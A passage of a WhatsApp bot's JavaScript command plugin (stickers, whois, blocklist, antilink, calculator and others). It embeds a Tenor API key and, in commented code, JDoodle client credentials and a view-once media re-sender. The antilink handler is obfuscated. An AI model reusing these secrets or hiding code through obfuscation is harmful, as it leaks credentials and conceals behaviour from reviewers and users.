                    await new sck({ id: citel.chat, goodbye: text,events:'true' }).save()
                    return citel.reply('Goodbye added for this group.\n *New Googbye Message Is :* '+text)
                } else {
                    await await sck.updateOne({ id: citel.chat }, { goodbye:text,events:'true' })
                    return citel.reply('Goodbye updated successfully.\n *New GoodBye Message Is :* '+text)    
                }      
               */
    })
     //---------------------------------------------------------------------------
     //---------------------------------------------------------------------------
    /* cmd({
                 pattern: "vv",
                 alias : ['viewonce','retrive'],
                 desc: "Flips given text.",
                 category: "misc",
                 use: '<query>',
                 filename: __filename
             },
             async(Void, citel, text) => {
    if(!citel.quoted) return citel.reply("```Uh Please Reply A ViewOnce Message```")
      
    if(citel.quoted.mtype === "viewOnceMessage")
    {
     if(citel.quoted.message.imageMessage )
    { let cap =citel.quoted.message.imageMessage.caption;
     let anu = await Void.downloadAndSaveMediaMessage(citel.quoted.message.imageMessage)
     Void.sendMessage(citel.chat,{image:{url : anu},caption : cap })
    }
    else if(citel.quoted.message.videoMessage )
    {
      let cap =citel.quoted.message.videoMessage.caption;
      let anu = await Void.downloadAndSaveMediaMessage(citel.quoted.message.videoMessage)
      Void.sendMessage(citel.chat,{video:{url : anu},caption : cap })
    }
    }
    else return citel.reply("```This is Not A ViewOnce Message```")
     
             }
         )
    
    
    
         */
     //---------------------------------------------------------------------------
     cmd({
            pattern: "quoted",
            desc: "get reply Message from Replied Message",
            category: "user",
            filename: __filename
        },
        async(Void, citel, text) => {
            if(!citel.quoted) return await citel.send("*_Uhh Dear, Reply to a Message_*")
            var quote
            try {
                 quote = await Void.serializeM(await citel.getQuotedObj())
            } catch (error) {return console.log("error while geting Quoted Message : " , error )}
    
            if (!quote.quoted) return await citel.replay('*Message you replied does not contain a reply Message*')
            else await Void.sendMessage(citel.chat, { react: { text: '✨', key: citel.key }}); 
            try {        
                let quote2 = await Void.serializeM(await quote.getQuotedObj())
                return await Void.copyNForward(citel.chat, quote2 , false ,)
            } catch (error) 
            {       
                const contextInfo = {}
                Void.forward(citel.chat ,quote.quoted, contextInfo , citel ); 
            }
            // attp | Void.sendMessage(citel.chat, { sticker: {url: `https://api.xteam.xyz/attp?file&text=${encodeURI(text)}`}}, {quoted: citel })
        })
    
         //---------------------------------------------------------------------------
         cmd({
            pattern: "blocklist",
            desc: "get list of all Blocked Numbers",
            category: "user",
            filename: __filename,
            use: '<text>',
        },
        async(Void, citel, text , {isCreator}) => {
            if(!isCreator) return await citel.reply(tlang().owner);
            try {
                const data = await Void.fetchBlocklist();
                if (data.length === 0) return await citel.reply(`Uhh Dear, You don't have any Blocked Numbers.`);
                let txt = `\n*≡ List*\n\n*_Total Users:* ${data.length}_\n\n┌─⊷ \t*BLOCKED USERS*\n`;
                for (let i = 0; i < data.length; i++) {      txt += `▢ ${i + 1}:- wa.me/${data[i].split("@")[0]}\n`;    }
                txt += "└───────────";
                return await Void.sendMessage(citel.chat, { text: txt });
              } catch (err) {
                console.error(err);
                return await citel.reply('*Error while getting Blocked Numbers.\nError: *' + err);
              }
        }
        )
         //---------------------------------------------------------------------------
     cmd({
                 pattern: "location",
                 desc: "Adds *readmore* in given text.",
                 category: "user",
                 filename: __filename
             },
             async(Void, citel, text) => {
              if (!text) return await citel.reply(`Give Coordinates To Send Location\n *Example:* ${prefix}location 24.121231,55.1121221`);
             let cord1 = parseFloat(text.split(',')[0]) || ''
             let cord2 = parseFloat(text.split(',')[1]) || ''
             if(!cord1 || isNaN(cord1) ||  !cord2 || isNaN(cord2)) return await  citel.reply("```Cordinates Not In Formate, Try Again```") 
    
    let txt  = "*----------LOCATION------------*"
       txt +="``` \n Sending Location Of Given Data: ";
       txt +="\n Latitude     :  "+cord1;
       txt +="\n Longitude  :  "+cord2 +"```\n"+Config.caption;
    
    await citel.reply (txt);
    
    
          return await Void.sendMessage(citel.chat, { location: { degreesLatitude : cord1, degreesLongitude : cord2 } } ,{quoted : citel} )
     }
         )
         //---------------------------------------------------------------------------
     
    
    /*
    
    cmd({
                 pattern: "exec",
                 desc: "Evaluates quoted code with given language.",
                 category: "misc",
                 filename: __filename
             },
             async(Void, citel, text) => {
      if (!citel.quoted) return citel.reply("*Reply to A Code Of Statements to Execute*")
                 try {
                     const code = {
                         script: citel.quoted.text,
                         language: text[1],
                         versionIndex: "0",
                         stdin: text.slice(2).join(" "),
                         clientId: '694805244d4f825fc02a9d6260a54a99',
                         clientSecret: '741b8b6a57446508285bb5893f106df3e20f1226fa3858a1f2aba813799d4734'
                     };
                     request({
                         url: "https://api.jdoodle.com/v1/execute",
                         method: "POST",
                         json: code
                     }, function(_error, _response, body) {  citel.reply("> " + text[1] + "\n\n" + "```" + body.output + "```");  });
                 } catch (error) {return await citel.reply("*Error In Your Code :* "+error);  }
             }
         )
         */
    
         //---------------------------------------------------------------------------
    
     cmd({
            pattern: "getpp",
            desc: "Get Profile Pic For Given User",
            category: "user",
            filename: __filename
        },
        async(Void, citel, text) => {
    
            if (!citel.quoted) return citel.reply (`*Please Reply To A User*`)
            let pfp;
            try  { pfp = await Void.profilePictureUrl(citel.quoted.sender, "image"); } 
            catch (e) {  return citel.reply("```Profile Pic Not Fetched```") } 
            return await Void.sendMessage(citel.chat, {image: { url: pfp },caption: '  *---Profile Pic Is Here---*\n'+Config.caption, },{quoted:citel}); 
    
    
             }
         )
         //---------------------------------------------------------------------------
     cmd({
                 pattern: "readmore",
                 alias:["rmore",'readmor'],
                 desc: "Adds *readmore* in given text.",
                 category: "misc",
                 filename: __filename
             },
             async(Void, citel, text) => {
                if(!text) {text = `*Uhh Dear, Give Text, Eg:- _.readmor text1 readmore text2_*`; }
                else { text += " " }
                text.includes("readmore")?await citel.reply(text.replace(/readmore/, (String.fromCharCode(8206)).repeat(4001))) : await citel.reply(text.replace(" ", (String.fromCharCode(8206)).repeat(4001)))
             }
         )
      //---------------------------------------------------------------------------
    cmd({
                pattern: "whois",
                desc: "Get replied person info",
                category: "user",
                use: '<reply to any person>',
                filename: __filename
            },
    async(Void, citel, text) => {
                if (!citel.quoted) return citel.reply(`Please Reply To A Person`);
                var bio = await Void.fetchStatus(citel.quoted.sender);
                var bioo = bio.status;
                var setAt = bio.setAt.toString();
                
                var words = setAt.split(" ");
                if(words.length > 3){ setAt= words.slice(0, 5).join(' ') ; }
                 
                var num = citel.quoted.sender.split('@')[0];
                let pfp;
                try  {  pfp = await Void.profilePictureUrl(citel.quoted.sender, "image"); } 
                catch (e) { pfp = await Void.profilePictureUrl(citel.sender, "image") ||  'https://telegra.ph/file/29a8c892a1d18fdb26028.jpg' ; }    //|| 'https://telegra.ph/file/29a8c892a1d18fdb26028.jpg' ;  }
                
                let username = await sck1.findOne({ id: citel.quoted.sender });
                var tname = username.name;
    
                
             return await Void.sendMessage(citel.chat, {
                    image: {   url: pfp  },
                    caption: `
    ╔════◇
    ║ *『Person's  Information』*
    ║ 
    ║ *🍫Name :* ${tname}
    ║ *👤Num :* ${num}
    ║ *🎐Bio    :*  ${bioo}
    ║ *🌟SetAt :* ${setAt}
    ║    *Keep Calm Dude🥳*    ◇
    ╚════════════════╝
    `,
                },{quoted:citel});
    
            }
        )
         //---------------------------------------------------------------------------
     cmd({
                 pattern: "vcard",
                 desc: "Create Contact by given name.",
                 category: "user",
                 filename: __filename
             },
             async(Void, citel, text) => {
    
    if (!citel.quoted) return citel.reply (`*Please Reply to User With Name*`);
    if ( !text ) return citel.reply( `Please Give Me User Name, \n *Example : ${prefix}vcard Suhail Tech Info* `)
    var words = text.split(" ");
    if (words.length >3) {   text= words.slice(0, 3).join(' ')  }
    // citel.reply(text);
    
    const vcard = 'BEGIN:VCARD\n' +
                'VERSION:3.0\n' +
                'FN:' + text + '\n' +
                'ORG:;\n' +
                'TEL;type=CELL;type=VOICE;waid=' + citel.quoted.sender.split('@')[0] + ':+' + owner[0] + '\n' +
                'END:VCARD'
            let buttonMessaged = {
                contacts: { displayName: text, contacts: [{ vcard }] },
                
            };
            return await Void.sendMessage(citel.chat, buttonMessaged, { quoted: citel });
     
    })
         //---------------------------------------------------------------------------
    
    
     cmd({
                 pattern: "calc",
                 desc: "Calculate two value.",
                 category: "misc",
                 filename: __filename
             },
             async(Void, citel, text) => {
                
                if (!text) return await citel.reply("Please enter a mathematical operation.");
                text = text.replace(/\s+/g, '');
                if (!/^(\d+([-+%*/]\d+)+)$/.test(text)) return await  citel.reply("Please enter a valid mathematical operation.");
                const evaluate = (exp) => {  return new Function('return ' + exp)(); };
                try {
                    const result = evaluate(text);
                    if (text.includes('/') && text.split('/').some((num) => num === '0')) return await citel.send("*Cannot divide by zero.*");
                    if (text.split(/[-+%*/]/).length <= 2) {
                        const [num1, operator, num2] = text.match(/\d+|[-+%*/]/g);
                        return citel.send(`${num1} ${operator} ${num2} = ${result}`);
                    } else {  return await citel.send(`Result: ${result}`); }
                } catch (error) {  }
    
    
    
    
    
    
    
    
    
    
    /*
    
    let func  =  text.split(";")[0];
    let num1  =  +text.split(";")[1];
    let num2  =  +text.split(";")[2];
    
    var c1 = num1.toString();
    var c2 = num2.toString();
    if(c1=="NaN" || c2 ==  "NaN") return citel.reply("*Numbers Are Not In Formate, Try Again*") 
    if (!text)
    {
    let txt="*--------------- CALCULATOR ----------------*\n";
     txt +=" \nChoose An Operator From List  ";
     txt +="\nFor Addittion    :  add ";
     txt +="\nFor Subtraction :  sub";
     txt +="\nFor  Multiply     :  mul";
     txt +="\nFor division       :  div";
     txt += `\n\n  Likewise :  ${prefix}calc add;10;50`;   
      return citel.reply(txt)
    }
    else if (func == "add" )  {  let result = num1+num2;
    return citel.reply (`${num1} + ${ num2}  = ${result}` );
    }
    else if (func == "sub" ) { let result = num1-num2;
    return citel.reply (`${num1} - ${ num2}  = ${result}` );
    }
    else if (func == "mul" ) { let result = num1*num2;
    return citel.reply (`${num1} * ${ num2}  = ${result}` );
    }
    else if (func == "div" ) { let result = num1/num2;
    return citel.reply (`${num1} / ${ num2}  = ${result}` );
    }
    else
     {
    return citel.reply(`Give me Query Like :  ${prefix}calc add;10;50 `);
    }
     */
             }
         )
    
    
         //---------------------------------------------------------------------------
     cmd({
                 pattern: "take",
                 desc: "Makes sticker of replied image/video.",
                 category: "sticker",
                 filename: __filename
             },
             async(Void, citel, text) => {
                 if (!citel.quoted) return citel.reply(`*Reply to a Sticker Sir.*`);
                 let mime = citel.quoted.mtype
                 if ( mime !="stickerMessage") return await citel.reply("```Uhh Please, Reply To A Sticker```") 
                 var pack;
                 var author;
                 if (text) {
                    let anu = text.split("|");
                     pack = anu[0] !== "" ? anu[0] : citel.pushName + '♥️';
                     author = anu[1] !== "" ? anu[1] : Config.packname;
                 } else {
                     pack = citel.pushName;
                     author =Config.packname;
                 }
                     let media = await citel.quoted.download();
                    let sticker = new Sticker(media, {
                        pack: pack,
                        author: author,
                        type:  StickerTypes.FULL,
                        categories: ["🤩", "🎉"], 
                        id: "12345", 
                        quality: 100,
                        background: "transparent", 
                    });
                    const buffer = await sticker.toBuffer();
                    return Void.sendMessage(citel.chat, {sticker: buffer }, {quoted: citel });
             }
         )
         //---------------------------------------------------------------------------
     cmd({
                 pattern: "uptime",
                 alias: ["runtime"],
                 desc: "Tells runtime/uptime of bot.",
                 category: "misc",
                 filename: __filename
             },
             async(Void, citel, text) => {
                 const upt = runtime(process.uptime())
                 citel.reply(`*_Uptime of ${tlang().title}: ${upt}_*`)
             }
         )
         //---------------------------------------------------------------------------
     cmd({
                 pattern: "wa",
                 desc: "Makes wa me of quoted or mentioned user.",
                 category: "user",
                 filename: __filename
             },
             async(Void, citel, text) => {
                 if(!citel.quoted && !citel.mentionedJid) return await citel.reply(`*Please Reply Or Mention A User*`);
                 let users = citel.mentionedJid ? citel.mentionedJid[0].split('@')[0] : citel.quoted ? citel.quoted.sender.split('@')[0] : text.replace('@')[0]
                return await  citel.reply(`https://wa.me/${users}`);
     
             }
         )
         //---------------------------------------------------------------------------
     cmd({
                 pattern: "mee",
                 desc: "Makes wa me for user.",
                 category: "user",
                 filename: __filename
             },
             async(Void, citel, text) => {  let user = citel.sender.split('@')[0]  ; return await citel.reply( `https://wa.me/${user}` ); })
         //---------------------------------------------------------------------------
     cmd({
                 pattern: "pick",
                 desc: "Pics random user from Group",
                 category: "group",
                 filename: __filename
             },
             async(Void, citel, match) => {
                 if (!match) return citel.reply("*Which type of User you want?*");
                 const groupMetadata = citel.isGroup ? await Void.groupMetadata(citel.chat)
                     .catch((e) => {}) : "";
                 const participants = citel.isGroup ? await groupMetadata.participants : "";
                 let member = participants.map((u) => u.id);
                 let me = citel.sender;
                 let pick = member[Math.floor(Math.random() * member.length)];
                 Void.sendMessage(citel.chat, {
                     text: `The most ${match} around us is *@${pick.split("@")[0]}*`,
                     mentions: [pick],
                 }, {
                     quoted: citel,
                 });
             }
         )
         //---------------------------------------------------------------------------
     cmd({
                 pattern: "nsfw",
                 desc: "activates and deactivates nsfw.\nuse buttons to toggle.",
                 category: "misc",
                 filename: __filename
             },
             async(Void, citel, text,{isCreator}) => {
                 let checkgroup = await sck.findOne({ id: citel.chat })
                 if (!citel.isGroup) return citel.reply(tlang().group);
                 const groupAdmins = await getAdmin(Void, citel)
                 //const botNumber = await Void.decodeJid(Void.user.id)
                // const isBotAdmins = citel.isGroup ? groupAdmins.includes(botNumber) : false;
                 const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
                 if(isCreator){}
      else if (!isAdmins) return citel.reply(tlang().admin)
                 //if (!isBotAdmins) return citel.reply(tlang().botadmin)
                
      
      
                 if (checkgroup.nsfw == "true") return citel.reply(`*NSFW* is enabled in this Chat \n For deActive 18+ Commands *type ${prefix}deact nsfw*`);
                 else return citel.reply(`*NSFW* is Disabled in this Chat \n For Active 18+ Commands *type ${prefix}act nsfw*`);
     }
         )
         //---------------------------------------------------------------------------
     cmd({
                 pattern: "npm",
                 desc: "download mp4 from url.",
                 category: "search",
                 use: '<package name>',
                 filename: __filename
             },
             async(Void, citel, text) => {
                 if (!text) return citel.reply('Please give me package name.📦')
                 axios.get(`https://api.npms.io/v2/search?q=${text}`).then(({ data }) => {
                     let txt = data.results.map(({ package: pkg }) => `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`).join('\n\n')
                     citel.reply(txt)
                 }).catch(e => console.log(e))
             }
         )
         //---------------------------------------------------------------------------
     cmd({
                 pattern: "fliptext",
                 desc: "Flips given text.",
                 category: "misc",
                 use: '<query>',
                 filename: __filename
             },
             async(Void, citel, text) => {
                 if (!text) return citel.reply(`Example : ${prefix}fliptext Back in black`)
                 flipe = text.split('').reverse().join('')
                 citel.reply(`\`\`\`「  Text Flipper Tool  」\`\`\`\n*IGiven text :*\n${text}\n*Fliped text :*\n${flipe}`)
     
             }
         )
         //---------------------------------------------------------------------------
     cmd({
                 pattern: "downmp4",
      
                 alias:['mp4down','mp4fromurl'],
                 desc: "download mp4 from url.",
                 category: "downloader",
                 use: '<url>',
                 filename: __filename
             },
             async(Void, citel, text) => {
                 if (!text) return citel.reply(`_give me Video Link ?_`);
                 Void.sendMessage(citel.chat, {
                     video: {
                         url: text.split(" ")[0],
                     },
                     caption: "*HERE WE GO*",
                     contextInfo: {
                         externalAdReply: {
                             title: tlang().title,
                             body: `${citel.pushName}`,
                             mediaType: 2,
                             mediaUrl: ``,
                             sourceUrl: ``,
                         },
                     },
                 }, {
                     quoted: citel,
                 });
     
             }
         )
         //---------------------------------------------------------------------------
     cmd({
                 pattern: "events",
                 desc: "activates and deactivates events.\nuse buttons to toggle.",
                 category: "misc",
                 filename: __filename
             },
             async(Void, citel, text,{isCreator}) => {
                 let checkgroup = await sck.findOne({ id: citel.chat })
                 if (!citel.isGroup) return citel.reply(tlang().group);
                 const groupAdmins = await getAdmin(Void, citel)
                 //const botNumber = await Void.decodeJid(Void.user.id)
                 //const isBotAdmins = citel.isGroup ? groupAdmins.includes(botNumber) : false;
                 const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
                 
      if(isCreator){}
      else if (!isAdmins) return citel.reply(tlang().admin)
                 //if (!isBotAdmins) return citel.reply(tlang().botadmin)
      
                 if (checkgroup.events == "true") return citel.reply(`*Events* is enabled in this Chat \n For deActive Welcome Msg *type ${prefix}deact events*`);
                 else return citel.reply(`*Events* is Disabled in this Chat \n For Active Welcome Msg *type ${prefix}act events*`);
     
             }
         )
         //---------------------------------------------------------------------------
     cmd({
                 pattern: "emix",
                 desc: "Mixes two emojies.",
                 category: "sticker",
                 use: '<query>',
                 filename: __filename
             },
             async(Void, citel, text,{ isCreator }) => {
                 if (!text) return citel.reply(`Example : ${prefix}emix 😅,🤔`);
    const { Sticker, createSticker, StickerTypes } = require("wa-sticker-formatter");
                 let emoji1 = text.split(",")[0] ;
                 let emoji2 = text.split(",")[1];
    
      const response = await fetch(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${emoji1}_${emoji2}`);
      const data = await response.json();
      if(data.locale=="") return citel.reply(`Can't Create Mixture, Please Try Other Emojies`)
      else {
    let media =await getBuffer(data.results[0].url)
    
    let sticker = new Sticker(media, {
                        pack: Config.packname, 
                        author: Config.author, 
                        type: StickerTypes.FULL ,
                        categories: ["🤩", "🎉"], 
                        id: "12345", 
                        quality: 100,
                    });
    const buffer = await sticker.toBuffer();
     return Void.sendMessage(citel.chat, {sticker: buffer}, {quoted: citel });
    }
       
      
             }
         )
         //---------------------------------------------------------------------------
    
     
    
     cmd({
                 pattern: "lydea",
                 alias : ["chatbot"],
                 desc: "activates and deactivates chatbot.\nuse buttons to toggle.",
                 category: "misc",
                 filename: __filename
             },
             async(Void, citel, text,{ isCreator }) => {
                 if (!isCreator) return citel.reply(tlang().owner)
                 const { chatbot } = require('../lib/');
                 let chatbott= await chatbot.findOne({ id: 'chatbot' }) ||  await new chatbot({ id: 'chatbot', worktype: "true" }).save()
                 switch (text.split(" ")[0])
                 {
                     case "on":
                         {
                             if (chatbott.worktype == "true") return citel.reply("*Lydea was already enabled.*")
                             await chatbot.updateOne({ id: 'chatbot' }, { worktype: "true" })
                             return await citel.reply('*Lydea Activated successfully.*')   
                         }
                         break
                     case "off":
                         {
                                    if (chatbott.worktype == "false") return citel.reply("*Lydea was already disabled.*")
                                    await chatbot.updateOne({ id: 'chatbot' }, { worktype: "false" })
                                    return await citel.reply('*Lydea deactivated successfully.*')
                         }
                         break
                     default:
                         {
                            if (chatbott.worktype == "false") return await citel.reply(`*Lydea Chatbot Status : False* \n*Lydea Chatbot Disabled Yet, _To Enable Type : .lydea on_*`)
                            else return await citel.reply("*Lydea Chatbot Status : True* \n*Lydea Chatbot Enabled Yet, _To Disable Type : .lydea off_*")
                            /*
                                let buttons = [{  buttonId: `${prefix}chatbot on`,   buttonText: {   displayText: "Turn On" },  type: 1, },
                                              {   buttonId: `${prefix}chatbot off`,  buttonText: { displayText: "Turn Off" },   type: 1, }];
                                               
                                await Void.sendButtonText(citel.chat, buttons, `Lydea Status: ${chatbott.worktype} `, Config.botname, citel);
                            */
                         }
                 }
     
     
          })
         //---------------------------------------------------------------------------
     cmd({
                 pattern: "ebinary",
                 desc: "encode binary",
                 category: "misc",
                 use: '<query>',
                 filename: __filename
             },
             async(Void, citel, text,{ isCreator }) => {
                 try {
                     if (!text) return citel.reply(`Send text to be encoded.`);
     
                     let textt = text || citel.quoted.text
                     let eb = await eBinary(textt);
                     citel.reply(eb);
                 } catch (e) {
                     console.log(e)
                 }
             }
         )
         //---------------------------------------------------------------------------
     cmd({
                 pattern: "dbinary",
                 desc: "decode binary",
                 category: "misc",
                 use: '<query>',
                 filename: __filename
             },
             async(Void, citel, text,{ isCreator }) => {
                 try {
                     if (!text) return citel.reply(`Send text to be decoded.`);
                     let eb = await dBinary(text);
                     citel.reply(eb);
                 } catch (e) {
                     console.log(e)
                 }
             }
         )
    
    //-----------------------------------------------------------------------------------
    
    if(Config.WORKTYPE != 'private')
    {
     
    cmd({
      pattern: "bot",
      desc: "activates and deactivates bot.\nuse buttons to toggle.",
      category: "misc",
      filename: __filename
    },
    async(Void, citel, text,{isCreator}) => {
      if (!citel.isGroup) return citel.reply(tlang().group);
      if(!isCreator) return citel.reply(tlang().owner)
      switch (text.split(" ")[0]) {
                case 'on':{
                        let checkgroup = await sck.findOne({ id: citel.chat })
                        if (!checkgroup) {
                            await new sck({ id: citel.chat, botenable: "true" }).save()
                            return citel.reply(`Successfully Enabled *${tlang().title}*`)
                        } else {
                            if (checkgroup.botenable == "true") return citel.reply("*Bot* was already enabled")
                            await sck.updateOne({ id: citel.chat }, { botenable: "true" })
                            return citel.reply(`Successfully Enabled *${tlang().title}*`)
                        }
                    }
    
                break
               case 'off':{
                           {
                            let checkgroup = await sck.findOne({ id: citel.chat })
                            if (!checkgroup) {
                                await new sck({ id: citel.chat, botenable: "false" })
                                    .save()
                                return citel.reply(`Successfully disabled *${tlang().title}*`)
                            } else {
                                if (checkgroup.botenable == "false") return citel.reply("*Bot* was already disabled")
                                await sck.updateOne({ id: citel.chat }, { botenable: "false" })
                                return citel.reply(`Successfully disabled *${tlang().title}*`)
                            }
                        }
               }
               break
               default:
               {
                       let checkgroup = await sck.findOne({ id: citel.chat })
                       let buttons = [{
                                 buttonId: `${prefix}bot on`,
                                 buttonText: {
                                     displayText: "Turn On",
                                 },
                                 type: 1,
                             },
                             {
                                 buttonId: `${prefix}bot off`,
                                 buttonText: {
                                     displayText: "Turn Off",
                                 },
                                 type: 1,
                             },
                         ];
                         await Void.sendButtonText(citel.chat, buttons, `Bot Status in Group: ${checkgroup.botenable}`, Void.user.name, citel);
               }
           }
    })   
    } // if Statements
         //---------------------------------------------------------------------------
     /*
     cmd({
                 pattern: "antispam",
                 desc: "Kick Spamers From Group.\nuse buttons to toggle.",
                 category: "group",
                 filename: __filename
             },
             async(Void, citel, text , {isCreator}) => {
                 if (!citel.isGroup) return citel.reply(tlang().group);
               let check = text ? text : '';
                 let checkgroup = await sck.findOne({ id: citel.chat }) || await new sck({id : citel.chat , antispam : 'true'  }) .save();
                 const groupAdmins = await getAdmin(Void, citel)
                 const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
                 if (!isAdmins && !isCreator) return citel.reply(tlang().admin)     
                 if (check.startsWith("on") || check.startsWith("enable") || check.startsWith("act"))
                 { 
                     try 
                     {
                      await sck.updateOne({ id: citel.chat }, { antispam: "true" })
                       return await citel.reply("*_Antispam Enabled Successfuly in Group_*")
                     } catch (error) {   return await citel.reply("*_There's an Error, Antispam Not Enable in Group_*")    }
                 }
                 else if (check.startsWith("off") || check.startsWith("disable") || check.startsWith("deact") ) 
                 {
                     try 
                     {
                        await sck.updateOne({ id: citel.chat }, { antispam: "false" })
                        return await citel.reply("*_Antispam Disabled Successfuly in Group_*")
                     } catch (error) {   return await citel.reply("*_There's an Error, Antispam Not Disable in Group_*")    }
                 }      
    if (checkgroup.antispam == "true") return citel.reply(`Antispam : kick Users Who Spamming in Group\n\nAntispam is enabled in this Group \n *_For Disabling : ${prefix}antispam off_*`);
    else return citel.reply(`Antispam : kick Users Who Spamming in Groupn\n\nAntispam is Disabled in this Group \n *_For Enablling Antispam : ${prefix}antispam on_*`);
             
     })
     */
         //---------------------------------------------------------------------------
         cmd({
            pattern: "antilink",
            desc: "activates and deactivates antilink.\nuse buttons to toggle.",
            category: "group",
            filename: __filename
        },
        async(Void, citel, text , {isCreator}) => {
            function _0x1dd1(_0x190e77,_0x3842b6){const _0x3a2918=_0x3a29();return _0x1dd1=function(_0x1dd110,_0xc0890d){_0x1dd110=_0x1dd110-0x12f;let _0x2f3ec3=_0x3a2918[_0x1dd110];return _0x2f3ec3;},_0x1dd1(_0x190e77,_0x3842b6);}const _0x537363=_0x1dd1;(function(_0x2a498c,_0xe9d7f2){const _0x20fff1=_0x1dd1,_0x275af4=_0x2a498c();while(!![]){try{const _0x1bf60a=-parseInt(_0x20fff1(0x135))/0x1+-parseInt(_0x20fff1(0x14a))/0x2*(-parseInt(_0x20fff1(0x14b))/0x3)+parseInt(_0x20fff1(0x12f))/0x4*(parseInt(_0x20fff1(0x14e))/0x5)+-parseInt(_0x20fff1(0x139))/0x6+parseInt(_0x20fff1(0x13b))/0x7+-parseInt(_0x20fff1(0x136))/0x8+-parseInt(_0x20fff1(0x13c))/0x9*(parseInt(_0x20fff1(0x148))/0xa);if(_0x1bf60a===_0xe9d7f2)break;else _0x275af4['push'](_0x275af4['shift']());}catch(_0x96c32a){_0x275af4['push'](_0x275af4['shift']());}}}(_0x3a29,0xebdc8));if(!citel['isGroup'])return citel['reply'](tlang()[_0x537363(0x141)]);const groupAdmins=await getAdmin(Void,citel),isAdmins=citel[_0x537363(0x130)]?groupAdmins[_0x537363(0x143)](citel[_0x537363(0x131)]):![];if(!isAdmins&&!isCreator)return citel[_0x537363(0x149)](tlang()[_0x537363(0x137)]);let checkinfo=await sck['findOne']({'id':citel[_0x537363(0x142)]})||await new sck({'id':citel[_0x537363(0x142)]})[_0x537363(0x13f)](),textt=text?text[_0x537363(0x151)]()['trim']():![],action=textt?textt[_0x537363(0x13e)]('\x20')[0x0]:![];function _0x3a29(){const _0x5d7267=['3041848KwfWrd','admin','delete','3314166wTfUba','antilink\x20kick/delete/off_*','3559514diYetN','9CvvJaC','*_Antilink\x20','split','save','updateOne','group','chat','includes','send','deact','off','*_Uhh\x20Dear,\x20Please\x20Provide\x20Valid\x20Instruction_*\x0a*Eg:\x20_','1361390agAqTj','reply','26518zyirsz','237MuHrUF','\x0a\x0a*Antilink\x20Modes:*\x0a\x20\x20.antilink\x20kick\x20(Delete\x20Links\x20&\x20Kick\x20Senders)\x0a\x20\x20.antilink\x20delete\x20(Delete\x20Links\x20Only)\x0a\x20\x20.antilink\x20off\x20(Disable\x20Antilink\x20in\x20chat)\x0a\x0a\x0a','disable','126675qiyDRV','*_Anti_Link\x20Succesfully\x20set\x20to\x20kick\x20link\x20senders!_*','kick','toLowerCase','caption','Disabled','startsWith','antilink','196ZzhnRb','isGroup','sender','false','*_Anti_Link\x20Disabled\x20Succesfully!_*','*Current\x20Mode:*\x20_','762559wgiCsM'];_0x3a29=function(){return _0x5d7267;};return _0x3a29();}if(!action)return await citel[_0x537363(0x144)](_0x537363(0x13d)+(checkinfo[_0x537363(0x155)]===_0x537363(0x132)?_0x537363(0x153):'Enabled')+'\x20in\x20this\x20Group!_*\x20\x0a\x20'+(checkinfo[_0x537363(0x155)]==='false'?'':_0x537363(0x134)+checkinfo[_0x537363(0x155)]+'_')+_0x537363(0x14c)+Config[_0x537363(0x152)]);else{if(action[_0x537363(0x154)](_0x537363(0x146))||action[_0x537363(0x154)](_0x537363(0x145))||action['startsWith'](_0x537363(0x14d)))return await sck[_0x537363(0x140)]({'id':citel['chat']},{'antilink':_0x537363(0x132)}),await citel['send'](_0x537363(0x133));else{if(action[_0x537363(0x154)]('kick'))return await sck[_0x537363(0x140)]({'id':citel[_0x537363(0x142)]},{'antilink':_0x537363(0x150)}),await citel[_0x537363(0x144)](_0x537363(0x14f));else{if(action['startsWith']('delete'))return await sck['updateOne']({'id':citel['chat']},{'antilink':_0x537363(0x138)}),await citel[_0x537363(0x144)]('*_Anti_Link\x20Succesfully\x20set\x20to\x20delete\x20links\x20from\x20chat!_*');else return await citel[_0x537363(0x144)](_0x537363(0x147)+prefix+_0x537363(0x13a));}}}
          
    })
         //---------------------------------------------------------------------------
     cmd({ on: "body" }, async(Void, citel) => {
       if (!Config.autoreaction) return 
       else if (Config.autoreaction === 'true' && citel.text.startsWith(prefix)) {
             const emojis = ['❤', '💕', '😻', '🧡', '💛', '💚', '💙', '💜', '🖤', '❣', '💞', '💓', '💗', '💖', '💘', '💝', '💟', '♥', '💌', '🙂', '🤗', '😌', '😉', '🤗', '😊', '🎊', '🎉', '🎁', '🎈', '👋']
             const emokis = emojis[Math.floor(Math.random() * (emojis.length))]
             Void.sendMessage(citel.chat, {
                 react: {
                     text: emokis,
                     key: citel.key
                 }
             })
         }
      
      else if (Config.autoreaction === 'all') {
